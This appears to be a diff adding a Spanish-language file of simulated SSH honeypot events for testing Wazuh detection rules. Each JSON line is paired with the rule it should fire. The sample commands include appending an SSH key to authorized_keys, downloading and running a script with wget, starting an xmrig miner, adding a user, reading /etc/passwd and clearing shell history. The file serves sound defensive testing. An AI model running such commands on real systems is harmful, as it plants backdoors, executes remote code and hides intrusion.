@@ -1,0 +1,56 @@
+# Eventos de muestra para probar honeypot_rules_ssh.xml con wazuh-logtest.
+# Uso en el manager:   sudo /var/ossec/bin/wazuh-logtest
+# Pegar UNA linea JSON (las que no empiezan con #) y mirar que regla dispara.
+# Bajo cada linea, entre parentesis, la regla que deberia disparar.
+# Las IPs son de documentacion (RFC 5737), no son atacantes reales.
+
+# --- Conexiones (ssh_connections.json) ---
+
+# (100351) escaner que no habla SSH
+{"timestamp": "2026-10-26 21:00:01", "honeypot_event": "ssh_connection", "ip": "203.0.113.10", "resultado": "sin_banner", "banner": null, "duracion_seg": 0.1, "intentos_login": 0}
+
+# (100350) login fallido: solo base, no alerta
+{"timestamp": "2026-10-26 21:00:02", "honeypot_event": "ssh_connection", "ip": "203.0.113.11", "resultado": "login_fallido", "banner": "SSH-2.0-OpenSSH_9.6", "duracion_seg": 3.2, "intentos_login": 3}
+
+# (100353) entro con cliente Go
+{"timestamp": "2026-10-26 21:00:03", "honeypot_event": "ssh_connection", "ip": "203.0.113.12", "resultado": "autenticado_sin_shell", "banner": "SSH-2.0-Go", "duracion_seg": 11.5, "intentos_login": 1}
+
+# (100352) entro con un cliente que parece de persona
+{"timestamp": "2026-10-26 21:00:04", "honeypot_event": "ssh_connection", "ip": "203.0.113.13", "resultado": "shell", "banner": "SSH-2.0-OpenSSH_9.6", "duracion_seg": 40.0, "intentos_login": 1}
+
+# --- Comandos (shell_commands.json) ---
+
+# (100367) reconocimiento
+{"timestamp": "2026-10-26 21:01:00", "honeypot_event": "shell_command", "ip": "203.0.113.20", "command": "uname -a", "canal": "exec", "nota": "Comando por canal exec"}
+
+# (100361) clave SSH propia
+{"timestamp": "2026-10-26 21:01:01", "honeypot_event": "shell_command", "ip": "203.0.113.21", "command": "cd ~; chattr -ia .ssh; echo \"ssh-rsa AAAAB3NzaC1yc2E bot@x\" >> .ssh/authorized_keys", "canal": "exec", "nota": "Comando por canal exec"}
+
+# (100363) descargar y ejecutar en un solo comando
+{"timestamp": "2026-10-26 21:01:02", "honeypot_event": "shell_command", "ip": "203.0.113.22", "command": "wget http://203.0.113.9/x.sh; chmod +x x.sh; ./x.sh", "canal": "exec", "nota": "Comando por canal exec"}
+
+# (100310, regla que ya existia) la parte de descarga, registrada por separado con su nota
+{"timestamp": "2026-10-26 21:01:02", "honeypot_event": "shell_command", "ip": "203.0.113.22", "command": "wget http://203.0.113.9/x.sh", "canal": "exec", "nota": "ALERTA: Intento de descarga de http://203.0.113.9/x.sh"}
+
+# (100362) criptominero
+{"timestamp": "2026-10-26 21:01:03", "honeypot_event": "shell_command", "ip": "203.0.113.23", "command": "./xmrig -o stratum+tcp://pool.example:3333", "canal": "shell", "nota": ""}
+
+# (100364) cuentas de usuario
+{"timestamp": "2026-10-26 21:01:04", "honeypot_event": "shell_command", "ip": "203.0.113.24", "command": "useradd -m test", "canal": "shell", "nota": ""}
+
+# (100364 NO deberia disparar: es lectura, cae en 100367)
+{"timestamp": "2026-10-26 21:01:05", "honeypot_event": "shell_command", "ip": "203.0.113.25", "command": "cat /etc/passwd", "canal": "shell", "nota": ""}
+
+# (100365) cron
+{"timestamp": "2026-10-26 21:01:06", "honeypot_event": "shell_command", "ip": "203.0.113.26", "command": "crontab -l", "canal": "exec", "nota": "Comando por canal exec"}
+
+# (100366) borrar rastros
+{"timestamp": "2026-10-26 21:01:07", "honeypot_event": "shell_command", "ip": "203.0.113.27", "command": "history -c", "canal": "shell", "nota": ""}
+
+# (100360) comando sin patron conocido: solo base. Probar tambien cat /etc/shadow:
+# hoy cae aca y no deberia, ver ejercicio en la conversacion.
+{"timestamp": "2026-10-26 21:01:08", "honeypot_event": "shell_command", "ip": "203.0.113.28", "command": "ls -la", "canal": "shell", "nota": ""}
+
+# --- Frecuencia (regla 100354) ---
+# Pegar 5 veces seguidas, en menos de 5 minutos, la linea de 100353 de arriba
+# (misma IP). A la quinta deberia disparar 100354.
